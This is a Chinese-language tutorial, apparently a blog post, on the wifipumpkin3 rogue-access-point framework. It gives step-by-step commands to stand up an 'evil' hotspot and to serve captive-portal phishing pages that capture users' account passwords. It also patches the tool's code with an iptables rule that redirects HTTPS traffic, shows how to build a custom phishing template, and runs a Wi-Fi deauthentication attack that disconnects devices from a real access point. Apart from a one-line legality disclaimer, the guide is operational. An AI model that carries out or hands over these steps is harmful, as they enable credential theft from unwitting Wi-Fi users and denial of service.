## 简介

`wifipumpkin3`是用Python编写wifi钓鱼攻击强大框架

可以快速方便的搭建一个钓鱼wifi，进行钓鱼或中间人攻击，免去了手动搭建环境的繁琐步骤

支持的攻击种类有：

> 恶意访问点攻击
>
> 中间人攻击
>
> 死角接入点攻击
>
> 额外的captiveflask模板
>
> DNS劫持
>
> 俘虏门户攻击 (captiveflask)
>
> 拦截，检查，修改和重放网络流量
>
> WiFi网络扫描
>
> DNS监控服务
>
> 凭证收集
>
> 透明代理
>
> LLMNR，NBT-NS和MDNS 投毒([Responder3](https://github.com/skelsec/Responder3))
>
> and **more**!

本文章仅限于技术交流,严禁用于非法途径

## 安装

> 使用环境：`kali 2021.2`
>
> 网卡：`RTL8812AU-VS(802.11ac 2x2 USB2.0)`

### 依赖安装

    
    
    sudo apt install hostapd  
    sudo apt install libssl-dev libffi-dev build-essential
    sudo apt install python3-pyqt5
    

### 框架安装

    
    
    git clone https://github.com/P0cL4bs/wifipumpkin3.git
    cd wifipumpkin3
    sudo python3 setup.py install
    

安装完成后使用`sudo wifipumpkin3 `命令即可开启框架

![image-20210305152836412](https://image.3001.net/images/20210306/1615002070_6042f9d615600c02a7e66.png!small)

## 使用

### 搭建简单钓鱼热点

使用以下命令可以建立起一个简单的热点

    
    
    # 设置热点名称
    wp3 > set ssid evil
    # 选择网卡
    wp3 > set interface wlan0
    # 设置代理插件（后面会讲）
    wp3 > set proxy noproxy
    wp3 > start
    

![image-20210305153536348](https://image.3001.net/images/20210306/1615002071_6042f9d70828ed6e7095b.png!small)

这时我们就能搜索到搭建的热点

![image-20210305153658637](https://image.3001.net/images/20210306/1615002073_6042f9d9059a0cfd06fed.png!small)

可以正常连接，同时，我们的kali上也会显示连接情况

![image-20210305153813696](https://image.3001.net/images/20210306/1615002074_6042f9da68e1cdff27ac8.png!small)

### 利用captiveflask强制用户登录

 **captiveflask**
是框架中代理功能中的一个选项，他可以阻止连接此wifi的用户上网，并令http请求跳转到钓鱼登录页面，从而获取用户的账号密码

以内置的登录网页为例

在`wifipumpkin3/wifipumpkin3/plugins/captiveflask`目录，有四个内置登录网页

![image-20210306093505716](https://image.3001.net/images/20210306/1615002075_6042f9db395d35be50eda.png!small)

我们此次使用DarkLogin.py

    
    
    # 设置热点名称
    wp3 > set ssid evil
    # 选择网卡
    wp3 > set interface wlan0
    # 设置代理插件
    wp3 > set proxy captiveflask
    # 设置模板
    wp3 > set captiveflask.DarkLogin true
    wp3 > start
    

通过`proxies`命令可以看到现在启用的插件和代理

![image-20210306093747947](https://image.3001.net/images/20210306/1615002075_6042f9dbd17aeb1524567.png!small)

此时链接wifi，即可显示登录页面

![image-20210306093906002](https://image.3001.net/images/20210306/1615002077_6042f9dd0dfbf634b49ef.png!small)

如果在此页面输入账号密码，就会被捕获

![image-20210306101029507](https://image.3001.net/images/20210306/1615002077_6042f9dd87d57803718f1.png!small)

未登录前所有http网站都无法访问，但是要注意的是，此插件 **无法拦截https流量**

如果想要拦截https流量，需要做以下修改：

设定拦截https

首先关闭`wifipumpkin3`

修改`wifipumpkin3/core/servers/proxy/captiveflask.py`，在第119行添加如下

    
    
    print(display_messages("redirecting HTTPS traffic", info=True))
            self.add_default_rules(
                "{iptables} -t nat -A PREROUTING -i {iface} -p tcp --dport 443 -j DNAT --to-destination {ip}:443".format(
                    iptables=self.getIptablesPath, iface=IFACE, ip=IP_ADDRESS, port=PORT
                )
            )
    

![image-20210306100406123](https://image.3001.net/images/20210306/1615002078_6042f9de47e0bdf93e582.png!small)

此时所有https流量均转发至本地443端口

    
    
    sudo python3 setup.py install
    

再次访问就无法打开https页面

![image-20210306100549929](https://image.3001.net/images/20210306/1615002079_6042f9df1285f3d93fa61.png!small)

自定义登录门户页面

首先在`wifipumpkin3/wifipumpkin3/plugins/captiveflask`目录添加一个模板

我们把DarkLogin.py复制一份，重命名为test.py

吧DarkLogin全替换为test

![image-20210306100743007](https://image.3001.net/images/20210306/1615002080_6042f9e00c1178029bbce.png!small)

随后修改配置文件`wifipumpkin3/config/app/captive-portal.ini `

![image-20210306101146288](https://image.3001.net/images/20210306/1615002081_6042f9e1000ad0c262c76.png!small)

接着把前端模板按照flask的目录格式，放到`wifipumpkin3/config/templates/test`文件夹下

![image-20210306101418527](https://image.3001.net/images/20210306/1615002081_6042f9e1cdf0c13a193be.png!small)

重新编译后启动

    
    
    wp3 > set ssid evil
    wp3 > set interface wlan0
    wp3 > set proxy captiveflask
    wp3 > set captiveflask.test true
    wp3 > start
    

![image-20210306101610741](https://image.3001.net/images/20210306/1615002082_6042f9e29a1842487936d.png!small)

链接wifi，发现跳转到自定义页面

![image-20210306101709299](https://image.3001.net/images/20210306/1615002083_6042f9e3709f7365effea.png!small)

### 执行wifi取消身份验证攻击

为了能让大部分设备连接我们的钓鱼热点，我们需要通过取消身份验证攻击令连接真实热点的设备掉线

什么是wifi取消身份验证攻击？

wifi取消身份验证攻击是一种拒绝服务攻击，它以用户和wifi接入点之间的通信为目标。

攻击者可以随时将带有身份验证对象欺骗地址的取消身份验证帧发送到无线访问点，令对象掉线。

    
    
    wp3 > use wifi.wifideauth
    wp3 : wifideauth > set interface wlan0
    wp3 : wifideauth > scan
    

![image-20210306110857069](https://image.3001.net/images/20210306/1615002084_6042f9e484b76a9298759.png!small)

将信道切换为11

![image-20210306110951692](https://image.3001.net/images/20210306/1615002085_6042f9e543b9ad6fa7f6e.png!small)

选择一个bssid

    
    
    wp3 > use wifi.wifideauth
    wp3 : wifideauth > set interface wlan0
    wp3 : wifideauth > set target xx:xx:e2:e8:e4
    

![image-20210306113056012](https://image.3001.net/images/20210306/1615002086_6042f9e60c58406bf27f3.png!small)

`start`运行后，目标wifi即无法连接

如果想将身份验证攻击与钓鱼热点结合使用，则需要准备俩网卡

